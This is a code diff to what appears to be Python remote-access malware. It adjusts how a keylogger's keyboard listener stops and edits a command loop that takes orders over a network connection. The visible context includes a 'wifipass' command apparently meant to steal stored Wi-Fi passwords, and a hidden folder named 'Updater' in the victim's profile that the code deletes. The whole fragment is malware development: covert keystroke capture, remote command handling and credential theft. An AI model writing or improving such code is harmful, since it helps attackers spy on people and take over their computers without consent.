@@ -257,6 +257,8 @@ def start_keylogger():
                                 keys_pressed.append(f' ')
                         else:
                             keys_pressed.append(str(key))
+                else:
+                    return False
             with keyboard.Listener(
                     on_press=on_press) as listener:
                 listener.join()
@@ -405,7 +407,6 @@ def run_commands():
                 else:
                     connection.send(str.encode("ending"))
                     logger_enabled = False
-                    keyboard.Listener.stop()
                     shutil.rmtree("C:\\Users\\" + getpass.getuser() + "\\Updater", ignore_errors=True)
             elif ldata == "wifipass" or ldata == "wifi pass":
                 pn = 0
